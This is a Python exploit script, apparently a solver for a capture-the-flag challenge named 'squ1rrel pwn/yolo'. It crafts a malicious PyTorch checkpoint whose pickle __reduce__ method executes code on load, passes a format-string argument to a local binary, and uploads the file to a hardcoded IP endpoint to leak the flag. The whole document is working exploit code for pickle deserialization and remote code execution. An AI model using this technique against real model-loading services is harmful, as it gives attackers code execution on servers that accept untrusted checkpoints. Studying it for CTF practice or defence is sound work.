#!/usr/bin/env python3
import argparse
import json
import re
import sys
from pathlib import Path

import requests
import torch


class EvilCheckpoint:
    def __reduce__(self):
        code = (
            "import subprocess;"
            "raise Exception(subprocess.check_output(['/app/yolo_status','%41$s']).decode())"
        )
        payload = f"__import__('builtins').exec({code!r})"
        return (eval, (payload,))


def extract_flag(text: str):
    patterns = [
        r"squ1rrel\{[^}]+\}",
        r"flag\{[^}]+\}",
        r"ctf\{[^}]+\}",
    ]
    for pat in patterns:
        m = re.search(pat, text, re.IGNORECASE)
        if m:
            return m.group(0)
    return None


def main():
    parser = argparse.ArgumentParser(description="Exploit solver for squ1rrel pwn/yolo")
    parser.add_argument(
        "--url",
        default="http://104.197.153.197/api/model/build",
        help="Target /api/model/build endpoint",
    )
    parser.add_argument(
        "--out",
        default="payload_flag.pt",
        help="Local path to generated malicious checkpoint",
    )
    args = parser.parse_args()

    out_path = Path(args.out)
    torch.save(EvilCheckpoint(), out_path)

    with out_path.open("rb") as f:
        resp = requests.post(
            args.url,
            files={"weights": (out_path.name, f, "application/octet-stream")},
            timeout=30,
        )

    print(f"[+] HTTP {resp.status_code}")
    body = resp.text

    try:
        parsed = resp.json()
        print(json.dumps(parsed, indent=2))
    except Exception:
        print(body)

    flag = extract_flag(body)
    if not flag:
        print("[-] Flag not found in response", file=sys.stderr)
        sys.exit(1)

    print(f"<FLAG>{flag}</FLAG>")


if __name__ == "__main__":
    main()
